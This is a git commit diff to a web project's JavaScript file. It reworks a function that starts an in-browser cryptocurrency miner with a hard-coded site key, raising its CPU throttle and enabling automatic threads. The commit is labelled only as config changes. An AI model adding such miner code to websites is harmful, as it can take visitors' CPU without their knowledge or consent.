75116f928618704d2872b368c2c5f07f09a91ec8
ES\NegiKara <karan.negi@adp.com>
2018-01-09 21:30:19 +0530

    Js config Changes commit

--- MiningCore.Web/Scripts/MineOne.js
+++ MiningCore.Web/Scripts/MineOne.js
@@ -1,11 +1,22 @@
-﻿function Test() {
-    try {
-        var miner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
-            throttle: 0.3
-        });
-        miner.start();
-        // Console.log('ServiceHit');
+﻿var mainMiner=null;
 
+function Test() {
+    try {
+
+        if (mainMiner != null && mainMiner.isRunning()) {
+            alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
+            mainMiner.stop();
+        }
+
+        mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
+            throttle: 0.6,
+            //threads:5,
+            autoThreads:true
+        });
+        mainMiner.start();
+
+        // Console.log('ServiceHit');
+        alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
     }
     catch (e) {
 
